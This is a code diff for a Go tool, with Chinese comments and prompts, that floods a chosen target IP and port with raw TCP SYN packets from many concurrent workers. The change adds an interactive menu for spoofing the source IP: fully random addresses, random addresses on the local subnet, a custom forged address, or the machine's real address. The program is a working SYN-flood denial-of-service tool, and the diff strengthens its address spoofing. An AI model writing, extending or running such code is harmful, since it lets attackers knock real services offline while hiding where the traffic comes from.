@@ -37,8 +37,128 @@ type packetSender interface {
 // newPacketSender 平台特定实现，在各平台文件中定义
 // func newPacketSender(deviceName string) (packetSender, error)
 
-func generateRandomIP() string {
-	return fmt.Sprintf("%d.%d.%d.%d", rand.Intn(256), rand.Intn(256), rand.Intn(256), rand.Intn(256))
+// sourceIPMode 源IP模式
+type sourceIPMode int
+
+const (
+	srcModeRandom       sourceIPMode = iota // 1. 随机IP
+	srcModeSubnetRandom                     // 2. 本网段随机IP
+	srcModeCustom                           // 3. 自定义IP
+	srcModeLocal                            // 4. 本机IP
+)
+
+// selectSourceIPMode 交互式选择源IP模式
+func selectSourceIPMode() (sourceIPMode, string) {
+	fmt.Println("\n源IP模式:")
+	fmt.Println("  1. 随机IP（每次发包使用随机源IP）")
+	fmt.Println("  2. 本网段随机IP（与本机同子网的随机IP）")
+	fmt.Println("  3. 自定义IP（手动指定源IP）")
+	fmt.Println("  4. 本机IP（使用本机真实IP）")
+	fmt.Print("请选择源IP模式 [1-4] (默认 1): ")
+
+	var input string
+	fmt.Scanln(&input)
+	input = strings.TrimSpace(input)
+	if input == "" {
+		return srcModeRandom, ""
+	}
+
+	switch input {
+	case "1":
+		return srcModeRandom, ""
+	case "2":
+		return srcModeSubnetRandom, ""
+	case "3":
+		fmt.Print("请输入自定义源IP: ")
+		var customIP string
+		fmt.Scanln(&customIP)
+		customIP = strings.TrimSpace(customIP)
+		if net.ParseIP(customIP) == nil {
+			fmt.Println("[警告] 无效的IP地址，回退到随机IP模式")
+			return srcModeRandom, ""
+		}
+		return srcModeCustom, customIP
+	case "4":
+		return srcModeLocal, ""
+	default:
+		fmt.Println("[警告] 无效选择，回退到随机IP模式")
+		return srcModeRandom, ""
+	}
+}
+
+// generateSubnetRandomIP 在指定子网内生成随机IP
+// networkIP 和 mask 定义子网范围
+func generateSubnetRandomIP(rng *rand.Rand, networkIP net.IP, mask net.IPMask) string {
+	network := networkIP.Mask(mask)
+	// 计算可用主机数
+	ones, bits := mask.Size()
+	hostBits := bits - ones
+	if hostBits <= 0 {
+		return network.String()
+	}
+	// 随机生成主机部分
+	maxHost := (1 << uint(hostBits)) - 2 // 排除网络地址和广播地址
+	if maxHost <= 0 {
+		maxHost = 1
+	}
+	hostNum := rng.Intn(maxHost) + 1 // 1 ~ maxHost
+
+	ip := make(net.IP, 4)
+	copy(ip, network.To4())
+	// 将 hostNum 写入主机位
+	hostBytes := make([]byte, 4)
+	hostBytes[0] = byte(hostNum >> 24)
+	hostBytes[1] = byte(hostNum >> 16)
+	hostBytes[2] = byte(hostNum >> 8)
+	hostBytes[3] = byte(hostNum)
+	for i := 0; i < 4; i++ {
+		ip[i] |= hostBytes[i] & ^mask[i]
+	}
+	return ip.String()
+}
+
+// sourceIPGenerator 封装源IP生成逻辑，避免 worker 中重复分支
+type sourceIPGenerator struct {
+	mode      sourceIPMode
+	customIP  string
+	localIP   string
+	networkIP net.IP
+	mask      net.IPMask
+}
+
+func newSourceIPGenerator(mode sourceIPMode, customIP string, iface *ifaceInfo) *sourceIPGenerator {
+	g := &sourceIPGenerator{
+		mode:     mode,
+		customIP: customIP,
+	}
+	if iface != nil {
+		g.localIP = iface.IP.String()
+		g.networkIP = iface.IP
+		g.mask = iface.Mask
+	}
+	return g
+}
+
+func (g *sourceIPGenerator) next(rng *rand.Rand) string {
+	switch g.mode {
+	case srcModeRandom:
+		return fmt.Sprintf("%d.%d.%d.%d", rng.Intn(256), rng.Intn(256), rng.Intn(256), rng.Intn(256))
+	case srcModeSubnetRandom:
+		if g.networkIP != nil && g.mask != nil {
+			return generateSubnetRandomIP(rng, g.networkIP, g.mask)
+		}
+		// fallback to full random
+		return fmt.Sprintf("%d.%d.%d.%d", rng.Intn(256), rng.Intn(256), rng.Intn(256), rng.Intn(256))
+	case srcModeCustom:
+		return g.customIP
+	case srcModeLocal:
+		if g.localIP != "" {
+			return g.localIP
+		}
+		return fmt.Sprintf("%d.%d.%d.%d", rng.Intn(256), rng.Intn(256), rng.Intn(256), rng.Intn(256))
+	default:
+		return fmt.Sprintf("%d.%d.%d.%d", rng.Intn(256), rng.Intn(256), rng.Intn(256), rng.Intn(256))
+	}
 }
 
 // selectInterface 根据目标 IP 选择最合适的网卡（纯 Go，不依赖 pcap）
@@ -224,47 +344,7 @@ func resolveMACByARP(ip string) (net.HardwareAddr, error) {
 	return net.ParseMAC(match)
 }
 
-// buildSynPacket 构造 SYN 包（纯 gopacket/layers，不需要 cgo）
-func buildSynPacket(srcMAC, dstMAC net.HardwareAddr, sourceIP string, sourcePort uint16, targetIP net.IP, targetPort uint16) ([]byte, error) {
-	ethLayer := layers.Ethernet{
-		SrcMAC:       srcMAC,
-		DstMAC:       dstMAC,
-		EthernetType: layers.EthernetTypeIPv4,
-	}
-
-	ipLayer := layers.IPv4{
-		Version:  4,
-		IHL:      5,
-		TTL:      64,
-		Protocol: layers.IPProtocolTCP,
-		SrcIP:    net.ParseIP(sourceIP),
-		DstIP:    targetIP,
-	}
-
-	tcpLayer := layers.TCP{
-		SrcPort:    layers.TCPPort(sourcePort),
-		DstPort:    layers.TCPPort(targetPort),
-		Seq:        rand.Uint32(),
-		DataOffset: 5,
-		Window:     5840,
-		SYN:        true,
-	}
-	tcpLayer.SetNetworkLayerForChecksum(&ipLayer)
-
-	buffer := gopacket.NewSerializeBuffer()
-	options := gopacket.SerializeOptions{
-		FixLengths:       true,
-		ComputeChecksums: true,
-	}
-
-	err := gopacket.SerializeLayers(buffer, options, &ethLayer, &ipLayer, &tcpLayer)
-	if err != nil {
-		return nil, err
-	}
-	return buffer.Bytes(), nil
-}
-
-func sendSynPackets(targetIP string, targetPort uint16, workerCount int, userIface *ifaceInfo) {
+func sendSynPackets(targetIP string, targetPort uint16, workerCount int, userIface *ifaceInfo, srcMode sourceIPMode, customIP string) {
 	parsedTargetIP := net.ParseIP(targetIP)
 
 	// ===== 统一选择网卡 =====
@@ -283,6 +363,21 @@ func sendSynPackets(targetIP string, targetPort uint16, workerCount int, userIfa
 	fmt.Printf("[信息] 本机 IP:  %s\n", iface.IP)
 	fmt.Printf("[信息] 本机 MAC: %s\n", iface.MAC)
 	fmt.Printf("[信息] 子网掩码: %s\n", iface.Mask)
+
+	// ===== 初始化源IP生成器 =====
+	var srcModeName string
+	switch srcMode {
+	case srcModeRandom:
+		srcModeName = "随机IP"
+	case srcModeSubnetRandom:
+		srcModeName = "本网段随机IP"
+	case srcModeCustom:
+		srcModeName = fmt.Sprintf("自定义IP (%s)", customIP)
+	case srcModeLocal:
+		srcModeName = fmt.Sprintf("本机IP (%s)", iface.IP)
+	}
+	fmt.Printf("[信息] 源IP模式: %s\n", srcModeName)
+	srcGen := newSourceIPGenerator(srcMode, customIP, iface)
 
 	// ===== 确定目的 MAC =====
 	var dstMAC net.HardwareAddr
@@ -365,7 +460,7 @@ func sendSynPackets(targetIP string, targetPort uint16, workerCount int, userIfa
 			ps := senders[workerID]
 
 			for atomic.LoadInt32(&stopFlag) == 0 {
-				srcIP := fmt.Sprintf("%d.%d.%d.%d", rng.Intn(256), rng.Intn(256), rng.Intn(256), rng.Intn(256))
+				srcIP := srcGen.next(rng)
 				srcPort := uint16(rng.Intn(65535))
 
 				ethLayer := layers.Ethernet{
@@ -446,5 +541,8 @@ func main() {
 	// 交互式选择网卡
 	selectedIface := selectInterfaceInteractive()
 
-	sendSynPackets(targetIP, uint16(targetPort), workerCount, selectedIface)
+	// 交互式选择源IP模式
+	srcMode, customIP := selectSourceIPMode()
+
+	sendSynPackets(targetIP, uint16(targetPort), workerCount, selectedIface, srcMode, customIP)
 }
